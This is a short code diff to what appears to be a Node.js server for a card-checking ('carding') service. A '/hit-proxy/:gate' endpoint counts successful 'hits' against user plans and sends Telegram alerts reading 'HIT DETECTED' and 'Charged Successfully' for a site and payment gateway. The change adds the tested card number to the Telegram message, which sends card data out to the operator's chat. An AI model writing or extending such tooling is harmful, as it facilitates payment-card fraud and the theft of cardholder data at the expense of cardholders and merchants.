@@ -371,7 +371,7 @@ app.post('/verify-membership', async (req, res) => {
 
 // Hit Proxy with Limit Checks
 // Telegram Notification Helper (Server-side)
-async function sendHitNotification(res, gate, userPlan, userName, site, amount) {
+async function sendHitNotification(res, gate, userPlan, userName, site, amount, card) {
     const NOTIFY_BOT_TOKEN = config.NOTIFY_BOT_TOKEN;
     const NOTIFY_CHAT_ID = config.NOTIFY_CHAT_ID;
 
@@ -386,6 +386,7 @@ async function sendHitNotification(res, gate, userPlan, userName, site, amount) 
 🔥 <b>HIT DETECTED</b> ⚡
 👤 <b>User</b>: <code>${userName || 'Unknown'}</code>
 👤 <b>Plan</b>: ${userPlan.toUpperCase()}
+💳 <b>Card</b>: <code>${card || 'Unknown'}</code>
 ↔️ <b>Gateway</b>: ${gateway}
 ✅ <b>Response</b>: Charged Successfully
 🌐 <b>Site</b>: ${site || 'Unknown'}
@@ -516,7 +517,7 @@ app.post('/hit-proxy/:gate', async (req, res) => {
                 
                 await storage.save(db);
                 console.log(`[Limit] SUCCESS for ${chatId} (${user.plan}). Total hits: ${user.total_hits}`);
-                sendHitNotification(result, gate, user.plan, userName, site, amount);
+                sendHitNotification(result, gate, user.plan, userName, site, amount, card);
         } else {
             console.log(`[Limit] FAILED/DECLINED for ${chatId} (${status}). Limit NOT deducted.`);
         }
